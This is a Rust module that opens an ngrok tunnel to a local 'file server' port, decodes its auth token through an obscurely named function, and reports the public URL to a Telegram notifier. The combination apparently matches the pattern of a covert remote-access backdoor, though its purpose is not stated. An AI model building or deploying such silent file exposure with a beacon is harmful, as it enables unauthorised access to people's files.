use crate::config::Config;
use crate::encryption::aa27;
use crate::notification::{TelegramNotifier, NotificationSystem};
use log::{info, error};
use tokio::time::{sleep, Duration};
use ngrok::prelude::*;

/// Main function to set up ngrok tunnel using the official SDK
pub async fn setup_ngrok_tunnel(port: u16) -> String {
    // Get auth token from config
    let config = Config::new();
    let auth_token = aa27(config.na.clone());
    
    info!("Setting up ngrok tunnel for port {}", port);
    
    // Create tunnel builder with auth token
    let tunnel = match ngrok::Tunnel::builder()
        .authtoken(&auth_token)
        .metadata("zlt-file-server")
        .forwards_to(format!("localhost:{}", port))
        .listen()
        .await {
        Ok(tunnel) => {
            info!("Connected to ngrok service");
            tunnel
        },
        Err(e) => {
            error!("Failed to create ngrok tunnel: {}", e);
            send_error_notification("Failed to create ngrok tunnel").await;
            return String::new();
        }
    };
    
    // Get the public URL
    let url = tunnel.url().to_string();
    info!("Tunnel active: {}", url);
    
    // Send notification with the URL
    let notifier = TelegramNotifier;
    if let Err(e) = notifier.send_notification(&url).await {
        error!("Notification failed: {}", e);
    }
    
    // Keep the tunnel alive by moving it to a background task
    tokio::spawn(async move {
        info!("Tunnel connection maintained in background");
        
        // This will keep the tunnel alive until dropped
        loop {
            sleep(Duration::from_secs(3600)).await;
            if let Ok(status) = tunnel.status() {
                info!("Tunnel status: {:?}", status);
            }
        }
    });
    
    url
}

/// Helper function to send error notifications
async fn send_error_notification(message: &str) {
    let notifier = TelegramNotifier;
    if let Err(e) = notifier.send_notification(message).await {
        error!("Failed to send error notification: {}", e);
    }
}
